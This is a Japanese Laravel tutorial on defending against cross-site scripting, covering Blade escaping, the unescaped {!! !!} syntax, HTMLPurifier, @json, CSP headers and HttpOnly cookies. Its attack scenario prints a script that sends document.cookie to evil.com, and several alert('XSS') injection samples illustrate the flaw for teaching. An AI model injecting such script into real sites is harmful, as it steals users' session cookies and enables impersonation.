# Tutorial 9-12-3: XSS対策

## 🎯 このセクションで学ぶこと

*   XSS（クロスサイトスクリプティング）攻撃の仕組みを理解する。
*   LaravelのBladeテンプレートが、どのようにXSS攻撃を防ぐかを学ぶ。
*   安全にHTMLを出力する方法を理解する。

---

## 導入：ユーザー入力の表示には危険が潜んでいる

前のセクションで、SQLインジェクション攻撃について学びました。このセクションでは、**XSS（Cross-Site Scripting）**攻撃について学びます。

XSS攻撃は、**悪意のあるJavaScriptコードを注入して、他のユーザーのブラウザで実行させる**攻撃です。

---

## 詳細解説

### 🔓 XSS攻撃とは

**XSS（クロスサイトスクリプティング）**とは、**Webページに悪意のあるスクリプトを埋め込む攻撃**です。

#### 攻撃のシナリオ

1. 攻撃者が、コメント欄に以下のような入力をする

```html
<script>
    // ユーザーのCookieを盗む
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

2. このコメントが、そのままHTMLに出力される
3. 他のユーザーがページを開くと、スクリプトが実行される
4. ユーザーのセッションIDが盗まれ、攻撃者がなりすましログインできる

**身近な例で理解する**：
これは、掲示板に「このリンクをクリックすると、あなたのパスワードが盗まれます」という罠を仕掛けるようなものです。

---

### 🛡️ LaravelのXSS保護

Laravelの**Bladeテンプレート**は、デフォルトで**自動的にエスケープ**します。

#### エスケープとは

**エスケープ**とは、**特殊文字をHTMLエンティティに変換**することです。

| 特殊文字 | HTMLエンティティ |
|---------|----------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` |

---

### ✅ Bladeの自動エスケープ

Bladeの`{{ }}`構文は、自動的にエスケープします。

```blade
<!-- 安全なコード -->
<p>{{ $comment }}</p>
```

**ユーザーが以下のように入力した場合**：

```html
<script>alert('XSS')</script>
```

**出力されるHTML**：

```html
<p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
```

**ブラウザでの表示**：

```
<script>alert('XSS')</script>
```

スクリプトは実行されず、ただの文字列として表示されます。

---

### ⚠️ エスケープを無効化する（危険）

`{!! !!}`構文を使うと、エスケープを無効化できます。

```blade
<!-- 🚨 危険なコード -->
<p>{!! $comment !!}</p>
```

**ユーザーが`<script>alert('XSS')</script>`と入力した場合**：

```html
<p><script>alert('XSS')</script></p>
```

スクリプトが実行されてしまいます。

**重要**：
`{!! !!}`は、**信頼できるデータのみ**に使用してください。ユーザー入力には絶対に使わないでください。

---

### ✅ 安全にHTMLを出力する方法

ユーザーが入力したHTMLを表示したい場合（例：リッチテキストエディタ）は、**HTMLサニタイザー**を使います。

#### HTMLPurifierのインストール

```bash
composer require mews/purifier
```

#### 使い方

```php
use Mews\Purifier\Facades\Purifier;

$cleanHtml = Purifier::clean($userInput);
```

**コードリーディング**：

*   `Purifier::clean()`：安全なHTMLタグのみを許可し、危険なタグ（`<script>`など）を削除

#### ビューで使う

```blade
<div>{!! Purifier::clean($post->content) !!}</div>
```

---

### 🔍 JavaScriptでの注意点

JavaScriptにユーザー入力を埋め込む場合も、エスケープが必要です。

#### 危険な例

```blade
<!-- 🚨 危険なコード -->
<script>
    var username = '{{ $username }}';
</script>
```

**ユーザーが`'; alert('XSS'); //`と入力した場合**：

```javascript
var username = ''; alert('XSS'); //';
```

スクリプトが実行されてしまいます。

#### 安全な例

```blade
<!-- ✅ 安全なコード -->
<script>
    var username = @json($username);
</script>
```

**出力**：

```javascript
var username = "'; alert('XSS'); //";
```

`@json`ディレクティブが、自動的にエスケープします。

---

### 💡 実践例：コメント機能

#### コントローラー

```php
<?php

namespace App\Http\Controllers;

use App\Models\Comment;
use Illuminate\Http\Request;

class CommentController extends Controller
{
    public function store(Request $request)
    {
        $request->validate([
            'content' => 'required|string|max:500',
        ]);
        
        Comment::create([
            'content' => $request->input('content'),
            'user_id' => auth()->id(),
        ]);
        
        return redirect()->back()->with('success', 'コメントを投稿しました');
    }
}
```

#### ビュー

```blade
@foreach ($comments as $comment)
    <div class="comment">
        <p><strong>{{ $comment->user->name }}</strong></p>
        <!-- 自動的にエスケープされる -->
        <p>{{ $comment->content }}</p>
        <small>{{ $comment->created_at->diffForHumans() }}</small>
    </div>
@endforeach
```

**コードリーディング**：

*   `{{ $comment->content }}`：自動的にエスケープされ、XSS攻撃を防ぐ

---

## 💡 TIP

### Content Security Policy (CSP)

CSPヘッダーを設定することで、XSS攻撃をさらに防げます。

```php
// ミドルウェアで設定
return $response->header('Content-Security-Policy', "default-src 'self'; script-src 'self'");
```

**コードリーディング**：

*   `default-src 'self'`：同じドメインからのリソースのみを許可
*   `script-src 'self'`：同じドメインからのスクリプトのみを許可

### HTTPOnlyフラグ

セッションCookieに`HttpOnly`フラグを設定することで、JavaScriptからのアクセスを防げます。

**config/session.php**

```php
'http_only' => true,
```

これにより、XSS攻撃でCookieが盗まれるリスクを軽減できます。

---

## ✨ まとめ

*   **XSS攻撃**は、Webページに悪意のあるスクリプトを埋め込む攻撃
*   Laravelの**Bladeテンプレート**は、`{{ }}`構文で自動的にエスケープする
*   `{!! !!}`構文は、エスケープを無効化するため、ユーザー入力には使わない
*   HTMLを安全に出力する場合は、**HTMLサニタイザー**（HTMLPurifier）を使う
*   JavaScriptにユーザー入力を埋め込む場合は、`@json`ディレクティブを使う
*   CSPヘッダーとHttpOnlyフラグで、さらにセキュリティを強化できる

---
